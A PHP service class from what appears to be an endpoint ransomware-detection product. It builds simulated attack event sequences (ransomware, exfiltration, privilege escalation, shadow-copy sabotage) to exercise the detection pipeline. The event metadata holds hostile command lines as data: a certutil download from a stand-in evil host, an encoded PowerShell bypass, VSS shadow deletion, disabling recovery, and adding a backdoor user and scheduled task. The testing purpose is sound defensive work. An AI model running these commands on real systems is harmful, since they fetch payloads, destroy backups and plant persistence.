<?php

namespace App\Services;

use App\Models\Agent;
use App\Models\Event;
use Illuminate\Support\Str;

/**
 * Génère des séquences d'événements simulés qui transitent par le pipeline
 * de détection complet (DynamicDetectionEngine → alertes → incidents → actions).
 *
 * Tous les événements créés portent is_simulation=true et un simulation_run_uuid
 * commun afin d'être filtrables / nettoyables facilement.
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * Scénarios disponibles
 * ─────────────────────────────────────────────────────────────────────────────
 *  ransomware_basic      — 7 événements  (chiffrement léger, une vague)
 *  ransomware_full       — 22 événements (kill chain complète avec exfiltration)
 *  mass_encrypt          — 18 événements (chiffrement massif Documents + Desktop)
 *  exfiltration          — 8  événements (accès fichiers sensibles + fuite réseau)
 *  suspicious_activity   — 5  événements (processus suspects, escalade de privilèges)
 */
class SimulationService
{
    public function __construct(
        private readonly AgentRiskService $riskService,
    ) {}

    // ──────────────────────────────────────────────────────────────────────────
    //  POINT D'ENTRÉE
    // ──────────────────────────────────────────────────────────────────────────

    /**
     * Lance un scénario de simulation sur l'agent donné.
     *
     * @param  Agent   $agent     Cible de la simulation
     * @param  string  $scenario  Identifiant du scénario
     * @return array   Résumé : events, alerts, incidents, actions
     */
    public function run(Agent $agent, string $scenario): array
    {
        $runUuid = (string) Str::uuid();

        $sequence = $this->buildSequence($scenario, $agent);

        $results = [
            'run_uuid'    => $runUuid,
            'scenario'    => $scenario,
            'agent_id'    => $agent->id,
            'agent_name'  => $agent->agent_name,
            'events'        => [],
            'alerts'        => [],
            'incidents'     => [],
            'actions_count' => 0,
            'errors'        => [],
        ];

        foreach ($sequence as $idx => $payload) {
            try {
                $event = Event::create([
                    'event_uuid'          => (string) Str::uuid(),
                    'agent_id'            => $agent->id,
                    'event_type'          => $payload['event_type'],
                    'path'                => $payload['path'] ?? null,
                    'old_path'            => $payload['old_path'] ?? null,
                    'file_extension'      => $payload['file_extension'] ?? null,
                    'file_size'           => $payload['file_size'] ?? null,
                    'score'               => 0,
                    'risk_level'          => 'normal',
                    'is_simulation'       => true,
                    'simulation_run_uuid' => $runUuid,
                    'metadata'            => array_merge(
                        $payload['metadata'] ?? [],
                        [
                            'simulation_scenario' => $scenario,
                            'simulation_step'     => $idx + 1,
                            'simulation_run_uuid' => $runUuid,
                        ]
                    ),
                    'observed_at' => now(),
                ]);

                $analysis = $this->riskService->handleIncomingEvent($event);
                $event->refresh();

                $results['events'][] = [
                    'step'       => $idx + 1,
                    'event_id'   => $event->id,
                    'event_type' => $event->event_type,
                    'path'       => $event->path,
                    'score'      => $event->score,
                    'risk_level' => $event->risk_level,
                ];

                if (! empty($analysis['alert_id'])) {
                    $alertId = $analysis['alert_id'];
                    if (! in_array($alertId, array_column($results['alerts'], 'id'))) {
                        $results['alerts'][] = [
                            'id'         => $alertId,
                            'risk_level' => $analysis['risk_level'] ?? 'normal',
                        ];
                    }
                }

                if (! empty($analysis['incident_id'])) {
                    $incidentId = $analysis['incident_id'];
                    if (! in_array($incidentId, array_column($results['incidents'], 'id'))) {
                        $results['incidents'][] = ['id' => $incidentId];
                    }
                }

                // AgentRiskService retourne le nombre d'actions créées, pas leur détail
                if (! empty($analysis['protection_actions_count'])) {
                    $results['actions_count'] = ($results['actions_count'] ?? 0)
                        + (int) $analysis['protection_actions_count'];
                }

            } catch (\Throwable $e) {
                $results['errors'][] = [
                    'step'    => $idx + 1,
                    'message' => $e->getMessage(),
                ];
            }
        }

        // Résumé
        $results['summary'] = [
            'total_events'    => count($results['events']),
            'total_alerts'    => count($results['alerts']),
            'total_incidents' => count($results['incidents']),
            'total_actions'   => $results['actions_count'],
            'max_risk'        => $this->maxRiskLevel($results['events']),
        ];

        return $results;
    }

    // ──────────────────────────────────────────────────────────────────────────
    //  SCÉNARIOS
    // ──────────────────────────────────────────────────────────────────────────

    public static function scenarios(): array
    {
        return [
            'ransomware_basic' => [
                'label'       => 'Ransomware basique',
                'description' => 'Une vague de 7 événements : accès fichiers sensibles, chiffrement, processus suspect et note de rançon.',
                'icon'        => 'fa-lock',
                'color'       => 'high',
                'event_count' => 7,
            ],
            'mass_encrypt' => [
                'label'       => 'Chiffrement massif',
                'description' => '18 événements de chiffrement en rafale sur Documents et Desktop — simule WannaCry / LockBit.',
                'icon'        => 'fa-database',
                'color'       => 'critical',
                'event_count' => 18,
            ],
            'ransomware_full' => [
                'label'       => 'Kill chain complète',
                'description' => '22 événements : reconnaissance → exfiltration → chiffrement massif → note de rançon.',
                'icon'        => 'fa-skull-crossbones',
                'color'       => 'critical',
                'event_count' => 22,
            ],
            'exfiltration' => [
                'label'       => 'Exfiltration de données',
                'description' => '8 événements : accès fichiers sensibles (RH, compta, config) + tentative d\'envoi réseau.',
                'icon'        => 'fa-upload',
                'color'       => 'high',
                'event_count' => 8,
            ],
            'suspicious_activity' => [
                'label'       => 'Activité suspecte',
                'description' => '5 événements : processus inconnus, modification de registre, escalade de privilèges.',
                'icon'        => 'fa-bug',
                'color'       => 'suspect',
                'event_count' => 5,
            ],
            'shadow_copy_attack' => [
                'label'       => 'Sabotage sauvegardes + LOLBins',
                'description' => '8 événements : suppression des clichés VSS (vssadmin/wmic), LOLBins (certutil, PowerShell encodé), puis chiffrement. Phase pré-chiffrement.',
                'icon'        => 'fa-eraser',
                'color'       => 'critical',
                'event_count' => 8,
            ],
        ];
    }

    // ──────────────────────────────────────────────────────────────────────────
    //  CONSTRUCTION DES SÉQUENCES
    // ──────────────────────────────────────────────────────────────────────────

    private function buildSequence(string $scenario, Agent $agent): array
    {
        $os   = strtolower($agent->metadata['os'] ?? 'windows');
        $base = $this->basePaths($os);

        return match ($scenario) {
            'ransomware_basic'    => $this->seqRansomwareBasic($base),
            'mass_encrypt'        => $this->seqMassEncrypt($base),
            'ransomware_full'     => $this->seqRansomwareFull($base),
            'exfiltration'        => $this->seqExfiltration($base),
            'suspicious_activity' => $this->seqSuspiciousActivity($base),
            'shadow_copy_attack'  => $this->seqShadowCopyAttack($base),
            default               => throw new \InvalidArgumentException("Scénario inconnu : $scenario"),
        };
    }

    // ─── Scénario 1 : Ransomware basique ─────────────────────────────────────

    private function seqRansomwareBasic(array $p): array
    {
        return [
            // 1 — accès à un fichier sensible
            ['event_type' => 'file_accessed',              'path' => $p['docs'] . 'Rapport_RH_2025.xlsx',            'file_extension' => 'xlsx'],
            // 2 — processus suspect lancé
            ['event_type' => 'suspicious_process_detected','path' => $p['temp'] . 'svchost_update.exe',              'metadata' => ['process_name' => 'svchost_update.exe', 'pid' => 4421]],
            // 3 — chiffrement d'un premier fichier
            ['event_type' => 'file_encrypted_extension',  'path' => $p['docs'] . 'Rapport_RH_2025.xlsx.locked',     'file_extension' => 'locked',  'old_path' => $p['docs'] . 'Rapport_RH_2025.xlsx'],
            // 4 — second chiffrement
            ['event_type' => 'file_encrypted_extension',  'path' => $p['docs'] . 'Comptes_2025.xlsx.locked',        'file_extension' => 'locked',  'old_path' => $p['docs'] . 'Comptes_2025.xlsx'],
            // 5 — renommage/déplacement en masse
            ['event_type' => 'file_moved',                'path' => $p['docs'] . 'Contrat_Client.docx.enc',         'file_extension' => 'enc',     'old_path' => $p['docs'] . 'Contrat_Client.docx'],
            // 6 — second processus suspect (propagation)
            ['event_type' => 'suspicious_process_detected','path' => $p['temp'] . 'wscript_helper.exe',             'metadata' => ['process_name' => 'wscript_helper.exe', 'pid' => 7832]],
            // 7 — note de rançon déposée
            ['event_type' => 'ransom_note_detected',      'path' => $p['docs'] . 'README-DECRYPT.txt',              'file_extension' => 'txt',     'metadata' => ['content_snippet' => 'Your files have been encrypted. Pay 0.05 BTC to...']],
        ];
    }

    // ─── Scénario 2 : Chiffrement massif ─────────────────────────────────────

    private function seqMassEncrypt(array $p): array
    {
        $events = [];
        $targets = [
            $p['docs']    . 'Rapport_Annuel_2024.xlsx',
            $p['docs']    . 'Plan_Comptable.xlsx',
            $p['docs']    . 'Contrats_Fournisseurs.docx',
            $p['docs']    . 'RH_Salaires_2025.xlsx',
            $p['docs']    . 'Budget_Q4_2025.xlsx',
            $p['desktop'] . 'Presentation_CA.pptx',
            $p['desktop'] . 'Notes_Reunion.docx',
            $p['desktop'] . 'Credentials_test.txt',
            $p['shared']  . 'Factures' . DIRECTORY_SEPARATOR . 'Facture_2025_001.pdf',
            $p['shared']  . 'Factures' . DIRECTORY_SEPARATOR . 'Facture_2025_002.pdf',
            $p['shared']  . 'RH'       . DIRECTORY_SEPARATOR . 'Contrat_Employe_A.pdf',
            $p['shared']  . 'RH'       . DIRECTORY_SEPARATOR . 'Contrat_Employe_B.pdf',
            $p['docs']    . 'backup_config.zip',
            $p['docs']    . 'database_export.sql',
        ];

        // Démarrage du ransomware
        $events[] = ['event_type' => 'suspicious_process_detected', 'path' => $p['temp'] . 'ransom_dropper.exe', 'metadata' => ['process_name' => 'ransom_dropper.exe', 'pid' => 1337]];

        foreach ($targets as $target) {
            $ext = pathinfo($target, PATHINFO_EXTENSION);
            $events[] = [
                'event_type'     => 'file_encrypted_extension',
                'path'           => $target . '.locked',
                'file_extension' => 'locked',
                'old_path'       => $target,
                'file_size'      => rand(10000, 500000),
            ];
        }

        // Note de rançon finale
        $events[] = [
            'event_type'     => 'ransom_note_detected',
            'path'           => $p['desktop'] . 'HOW_TO_DECRYPT.html',
            'file_extension' => 'html',
            'metadata'       => ['content_snippet' => 'All your files are encrypted. Visit our onion site...'],
        ];
        $events[] = [
            'event_type'     => 'ransom_note_detected',
            'path'           => $p['docs'] . 'HOW_TO_DECRYPT.html',
            'file_extension' => 'html',
            'metadata'       => ['content_snippet' => 'All your files are encrypted. Visit our onion site...'],
        ];

        return $events;
    }

    // ─── Scénario 3 : Kill chain complète ────────────────────────────────────

    private function seqRansomwareFull(array $p): array
    {
        return [
            // Phase 1 — Reconnaissance
            ['event_type' => 'file_accessed',              'path' => $p['sys']  . 'hosts',                           'metadata' => ['phase' => 'recon']],
            ['event_type' => 'suspicious_process_detected','path' => $p['temp'] . 'net_scanner.exe',                 'metadata' => ['process_name' => 'net_scanner.exe', 'pid' => 2001, 'phase' => 'recon']],

            // Phase 2 — Persistance
            ['event_type' => 'suspicious_process_detected','path' => $p['startup'] . 'WinUpdate.exe',               'metadata' => ['process_name' => 'WinUpdate.exe',  'pid' => 2045, 'phase' => 'persistence']],
            ['event_type' => 'file_modified',              'path' => $p['sys']  . 'config' . DIRECTORY_SEPARATOR . 'autorun.inf', 'metadata' => ['phase' => 'persistence']],

            // Phase 3 — Exfiltration
            ['event_type' => 'file_accessed',              'path' => $p['docs']  . 'RH_Salaires_2025.xlsx',         'file_extension' => 'xlsx', 'metadata' => ['phase' => 'exfil']],
            ['event_type' => 'file_accessed',              'path' => $p['docs']  . 'Credentials.kdbx',              'file_extension' => 'kdbx', 'metadata' => ['phase' => 'exfil']],
            ['event_type' => 'network_connection',         'path' => null,                                           'metadata' => ['dst_ip' => '185.220.101.47', 'dst_port' => 443, 'bytes_sent' => 2_500_000, 'phase' => 'exfil']],

            // Phase 4 — Chiffrement
            ['event_type' => 'suspicious_process_detected','path' => $p['temp'] . 'crypt32_helper.exe',             'metadata' => ['process_name' => 'crypt32_helper.exe', 'pid' => 5501, 'phase' => 'encrypt']],
            ['event_type' => 'file_encrypted_extension',  'path' => $p['docs']  . 'RH_Salaires_2025.xlsx.locked',  'file_extension' => 'locked', 'old_path' => $p['docs'] . 'RH_Salaires_2025.xlsx'],
            ['event_type' => 'file_encrypted_extension',  'path' => $p['docs']  . 'Credentials.kdbx.locked',       'file_extension' => 'locked', 'old_path' => $p['docs'] . 'Credentials.kdbx'],
            ['event_type' => 'file_encrypted_extension',  'path' => $p['docs']  . 'Budget_Previsionnel.xlsx.locked','file_extension' => 'locked', 'old_path' => $p['docs'] . 'Budget_Previsionnel.xlsx'],
            ['event_type' => 'file_encrypted_extension',  'path' => $p['docs']  . 'Contrats_Clients.zip.locked',   'file_extension' => 'locked', 'old_path' => $p['docs'] . 'Contrats_Clients.zip'],
            ['event_type' => 'file_encrypted_extension',  'path' => $p['desktop'].'Projet_Secret.docx.locked',     'file_extension' => 'locked', 'old_path' => $p['desktop'] . 'Projet_Secret.docx'],
            ['event_type' => 'file_encrypted_extension',  'path' => $p['desktop'].'Photos_Equipe.zip.locked',      'file_extension' => 'locked', 'old_path' => $p['desktop'] . 'Photos_Equipe.zip'],
            ['event_type' => 'file_moved',                'path' => $p['shared'] . 'Backup_2025.tar.enc',           'file_extension' => 'enc',   'old_path' => $p['shared'] . 'Backup_2025.tar'],
            ['event_type' => 'file_moved',                'path' => $p['shared'] . 'DB_Export.sql.enc',             'file_extension' => 'enc',   'old_path' => $p['shared'] . 'DB_Export.sql'],

            // Phase 5 — Shadow copy suppression
            ['event_type' => 'suspicious_process_detected','path' => $p['sys'] . 'vssadmin.exe',                   'metadata' => ['process_name' => 'vssadmin.exe', 'args' => 'delete shadows /all /quiet', 'phase' => 'cover_tracks']],

            // Phase 6 — Notes de rançon
            ['event_type' => 'ransom_note_detected',      'path' => $p['docs']  . 'RESTORE_FILES.txt',             'file_extension' => 'txt',   'metadata' => ['content_snippet' => 'Your documents are encrypted. Deadline: 72h. BTC wallet: 1A2B3C...']],
            ['event_type' => 'ransom_note_detected',      'path' => $p['desktop'].'RESTORE_FILES.txt',             'file_extension' => 'txt',   'metadata' => ['content_snippet' => 'Your documents are encrypted. Deadline: 72h. BTC wallet: 1A2B3C...']],
            ['event_type' => 'ransom_note_detected',      'path' => $p['shared'] . 'RESTORE_FILES.txt',            'file_extension' => 'txt',   'metadata' => ['content_snippet' => 'Your documents are encrypted. Deadline: 72h. BTC wallet: 1A2B3C...']],

            // Phase 7 — Propagation latérale
            ['event_type' => 'network_connection',        'path' => null,                                           'metadata' => ['dst_ip' => '192.168.1.1', 'dst_port' => 445, 'protocol' => 'smb', 'phase' => 'lateral']],
            ['event_type' => 'suspicious_process_detected','path' => $p['temp'] . 'wmic_lateral.exe',              'metadata' => ['process_name' => 'wmic_lateral.exe', 'pid' => 9901, 'phase' => 'lateral']],
        ];
    }

    // ─── Scénario 4 : Exfiltration ────────────────────────────────────────────

    private function seqExfiltration(array $p): array
    {
        return [
            ['event_type' => 'file_accessed',  'path' => $p['docs'] . 'RH_Salaires_2025.xlsx',             'file_extension' => 'xlsx'],
            ['event_type' => 'file_accessed',  'path' => $p['docs'] . 'Liste_Clients_Confidentielle.xlsx', 'file_extension' => 'xlsx'],
            ['event_type' => 'file_accessed',  'path' => $p['docs'] . 'Credentials_Serveurs.txt',          'file_extension' => 'txt'],
            ['event_type' => 'file_accessed',  'path' => $p['docs'] . 'Config_VPN.ovpn',                   'file_extension' => 'ovpn'],
            ['event_type' => 'file_modified',  'path' => $p['docs'] . 'archive_exfil.zip',                 'file_extension' => 'zip',  'file_size' => 15_000_000],
            ['event_type' => 'suspicious_process_detected', 'path' => $p['temp'] . 'curl_upload.exe', 'metadata' => ['process_name' => 'curl_upload.exe', 'pid' => 6600]],
            ['event_type' => 'network_connection', 'path' => null, 'metadata' => ['dst_ip' => '91.108.4.1', 'dst_port' => 443, 'bytes_sent' => 15_000_000]],
            ['event_type' => 'file_deleted',   'path' => $p['docs'] . 'archive_exfil.zip',                 'file_extension' => 'zip',  'metadata' => ['reason' => 'cover_tracks']],
        ];
    }

    // ─── Scénario 5 : Activité suspecte ──────────────────────────────────────

    private function seqSuspiciousActivity(array $p): array
    {
        return [
            ['event_type' => 'suspicious_process_detected', 'path' => $p['temp'] . 'mimikatz_dump.exe', 'metadata' => ['process_name' => 'mimikatz_dump.exe', 'pid' => 3300]],
            ['event_type' => 'suspicious_process_detected', 'path' => $p['sys']  . 'cmd.exe',           'metadata' => ['process_name' => 'cmd.exe', 'args' => 'net user hacker P@ssw0rd /add', 'pid' => 3301]],
            ['event_type' => 'file_modified',               'path' => $p['sys']  . 'config' . DIRECTORY_SEPARATOR . 'Security', 'metadata' => ['target' => 'registry_hive']],
            ['event_type' => 'suspicious_process_detected', 'path' => $p['sys']  . 'schtasks.exe',      'metadata' => ['process_name' => 'schtasks.exe', 'args' => '/create /tn BackdoorTask /tr cmd.exe /sc onlogon', 'pid' => 3302]],
            ['event_type' => 'file_accessed',               'path' => $p['sys']  . 'SAM',               'metadata' => ['target' => 'credential_store']],
        ];
    }

    // ─── Scénario 6 : Sabotage sauvegardes + LOLBins ─────────────────────────

    private function seqShadowCopyAttack(array $p): array
    {
        return [
            // 1 — LOLBin : téléchargement furtif du payload via certutil
            ['event_type' => 'lolbins_abuse_detected', 'path' => 'process://5500', 'metadata' => [
                'process_name' => 'certutil.exe',
                'cmdline'      => ['certutil', '-urlcache', '-split', '-f', 'http://evil.example/payload.enc', 'C:\\Windows\\Temp\\payload.enc'],
                'reason'       => 'Téléchargement de payload via certutil -urlcache (LOLBin).',
            ]],
            // 2 — LOLBin : exécution de commande PowerShell encodée
            ['event_type' => 'lolbins_abuse_detected', 'path' => 'process://5501', 'metadata' => [
                'process_name' => 'powershell.exe',
                'cmdline'      => ['powershell', '-exec', 'bypass', '-encodedcommand', 'SQBuAHYAbwBrAGUA...'],
                'reason'       => 'PowerShell -encodedcommand avec -exec bypass (contournement restrictions).',
            ]],
            // 3 — Suppression des clichés VSS via vssadmin
            ['event_type' => 'shadow_copy_deletion_detected', 'path' => 'process://5502', 'metadata' => [
                'process_name' => 'vssadmin.exe',
                'cmdline'      => ['vssadmin', 'delete', 'shadows', '/all', '/quiet'],
                'reason'       => 'Suppression de tous les clichés instantanés VSS.',
            ]],
            // 4 — Suppression via wmic (méthode alternative)
            ['event_type' => 'shadow_copy_deletion_detected', 'path' => 'process://5503', 'metadata' => [
                'process_name' => 'wmic.exe',
                'cmdline'      => ['wmic', 'shadowcopy', 'delete'],
                'reason'       => 'Suppression des shadow copies via wmic.',
            ]],
            // 5 — Désactivation de la récupération système
            ['event_type' => 'shadow_copy_deletion_detected', 'path' => 'process://5504', 'metadata' => [
                'process_name' => 'bcdedit.exe',
                'cmdline'      => ['bcdedit', '/set', 'recoveryenabled', 'no'],
                'reason'       => 'Désactivation de la récupération au démarrage.',
            ]],
            // 6 — Premier fichier chiffré
            ['event_type' => 'file_encrypted_extension', 'path' => $p['docs'] . 'Rapport_Q4.xlsx.locked', 'file_extension' => 'locked'],
            // 7 — Chiffrement en rafale
            ['event_type' => 'mass_rename_detected', 'path' => $p['docs'], 'metadata' => [
                'rename_count_30s' => 47,
                'reason'           => 'Renommages massifs détectés après sabotage des sauvegardes.',
            ]],
            // 8 — Note de rançon déposée
            ['event_type' => 'file_created', 'path' => $p['desktop'] . 'HOW_TO_RECOVER_FILES.txt', 'file_extension' => 'txt'],
        ];
    }

    // ──────────────────────────────────────────────────────────────────────────
    //  UTILITAIRES
    // ──────────────────────────────────────────────────────────────────────────

    private function basePaths(string $os): array
    {
        if ($os === 'windows' || $os === 'win') {
            return [
                'docs'    => 'C:\\Users\\user\\Documents\\',
                'desktop' => 'C:\\Users\\user\\Desktop\\',
                'temp'    => 'C:\\Users\\user\\AppData\\Local\\Temp\\',
                'shared'  => 'C:\\Shared\\',
                'sys'     => 'C:\\Windows\\System32\\',
                'startup' => 'C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\',
            ];
        }

        if ($os === 'macos' || $os === 'darwin') {
            return [
                'docs'    => '/Users/user/Documents/',
                'desktop' => '/Users/user/Desktop/',
                'temp'    => '/var/folders/tmp/',
                'shared'  => '/Volumes/Shared/',
                'sys'     => '/System/Library/',
                'startup' => '/Library/LaunchAgents/',
            ];
        }

        // Linux par défaut
        return [
            'docs'    => '/home/user/Documents/',
            'desktop' => '/home/user/Desktop/',
            'temp'    => '/tmp/',
            'shared'  => '/srv/shared/',
            'sys'     => '/usr/bin/',
            'startup' => '/etc/init.d/',
        ];
    }

    private function maxRiskLevel(array $events): string
    {
        $order = ['normal' => 0, 'suspect' => 1, 'high' => 2, 'critical' => 3];
        $max   = 'normal';
        foreach ($events as $e) {
            $level = $e['risk_level'] ?? 'normal';
            if (($order[$level] ?? 0) > ($order[$max] ?? 0)) {
                $max = $level;
            }
        }
        return $max;
    }
}
